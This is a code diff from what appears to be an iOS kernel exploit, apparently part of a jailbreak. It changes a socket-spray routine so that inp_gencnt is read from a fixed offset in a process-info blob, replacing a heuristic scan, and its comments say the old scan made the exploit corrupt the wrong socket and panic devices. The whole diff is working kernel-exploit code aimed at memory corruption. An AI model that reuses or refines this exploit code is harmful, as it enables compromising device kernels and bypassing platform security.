@@ -62,29 +62,17 @@ uint64_t cs2_spray_socket(void) {
     // this is to get inp_gencnt from inpcb to know which socket inpcb belongs to
     __proc_info(CS2_PROC_INFO_CALL_PIDFILEPORTINFO, getpid(), CS2_PROC_PIDFILEPORTSOCKETINFO, output_socket_port, socket_info, 0x400);
 
-    /* drift law (2026-10-24 cross-ref note 201): a FIXED 0x110 offset is the
-       NECP-drift class — it silently read wrong fields on newer trains.
-       inp_gencnt is a small counting u64: prefer 0x110 if it yields a
-       plausible counter, else self-calibrate by scanning the blob. */
+    /* Dopamine 3.0.12 verbatim: PIDFILEPORTSOCKETINFO carries inp_gencnt at
+       blob+0x110. The 2026-10-24 self-calibration picked the first small
+       qword in the blob when 0x110 looked implausible — that can match a
+       DIFFERENT pcb's gencnt and make the exploit corrupt the wrong socket
+       (the 2026-11-01/02 iPhone 11 socket-zone + static-region panics).
+       Keep the upstream fixed offset; on failure the scan simply misses
+       (KERN_FAILURE) instead of mis-targeting. */
     uint64_t inp_gencnt = 0;
-    uint64_t v110 = 0;
-    memcpy(&v110, socket_info + 0x110, sizeof(v110));
-    if (v110 && (v110 >> 32) == 0 && v110 < 0x4000000) {
-        inp_gencnt = v110;
-    } else {
-        uint64_t caloff = 0;
-        for (size_t o = 0x40; o + 8 <= 0x400; o += 4) {
-            uint64_t v; memcpy(&v, socket_info + o, sizeof(v));
-            if (v && (v >> 32) == 0 && v < 0x4000000) { inp_gencnt = v; caloff = o; break; }
-        }
-        { static uint64_t pick_logs = 0;
-          if (inp_gencnt && pick_logs++ < 3)
-            LOG("gencnt pick: blob+0x%llx val=%#llx (0x110 gave 0x%llx)",
-                (unsigned long long)caloff, (unsigned long long)inp_gencnt, (unsigned long long)v110);
-          else if (pick_logs == 3) { pick_logs++; LOG("gencnt pick logs capped (self-calibration continues silently)"); } }
-    }
+    memcpy(&inp_gencnt, socket_info + 0x110, sizeof(inp_gencnt));
     if (inp_gencnt == 0) {
-        LOG("spray socket %zu: no plausible gencnt in PIDFILEPORTSOCKETINFO blob", cs2_ctx.socket_ports_count);
+        LOG("spray socket %zu: gencnt@0x110 is 0 (no mis-target fallback)", cs2_ctx.socket_ports_count);
     }
     static size_t gencnt_logs = 0;
     if (gencnt_logs++ < 3) LOG("spray gencnt[%zu]=%#llx", cs2_ctx.socket_ports_count, inp_gencnt);
